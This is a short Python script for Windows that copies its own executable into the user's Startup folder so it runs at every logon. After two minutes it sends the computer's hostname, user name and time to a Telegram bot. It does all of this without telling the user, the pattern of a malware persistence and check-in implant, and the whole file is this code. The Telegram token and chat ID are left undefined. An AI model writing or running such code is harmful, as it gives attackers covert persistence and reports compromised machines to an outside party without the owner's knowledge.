import socket
from datetime import datetime
import os
import sys
import requests
import shutil
import time

fid = os.listdir(str(os.path.expanduser('~')) + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')

try:
    fid.index(os.path.basename(sys.argv[0]).replace('.py', '.exe'))
except ValueError:
    dest = shutil.copyfile(os.getcwd() + '\\' + os.path.basename(sys.argv[0]).replace('.py', '.exe'),
                           os.path.expanduser('~') +
                           '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' +
                           os.path.basename(sys.argv[0]).replace('.py', '.exe'))

fid = os.listdir(str(os.path.expanduser('~')) + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')

time.sleep(120)

try:
    message = (
            str(datetime.now().strftime("%Y-%m-%d %H:%M:%S")) + ':  ' +
            socket.gethostname() + '(' +
            str(os.getlogin()) + ') is online')
    url = (
        f"https://api.telegram.org/{token}/sendMessage?chat_id={chat_id}"
        f"&text={message}")
    print('sended message:\n' + str(requests.get(url).json()))
except:
    pass
